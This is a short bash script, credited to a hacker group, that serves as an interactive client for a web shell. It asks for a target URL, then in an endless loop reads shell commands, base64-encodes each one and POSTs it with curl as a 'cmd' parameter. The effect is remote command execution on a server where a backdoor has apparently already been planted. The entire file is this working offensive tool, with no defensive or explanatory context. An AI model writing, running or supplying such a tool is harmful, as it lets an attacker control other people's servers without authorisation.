#!/bin/bash
#Copyright 2024 - NuLz | Haxorstars

echo -n "Target >: "
read target

while true
do
	echo -n "CMD:~# "
	read cmd
	cmd_base64=$(echo -n "$cmd" | base64)
	curl -d "cmd=$cmd_base64" -X POST $target
done
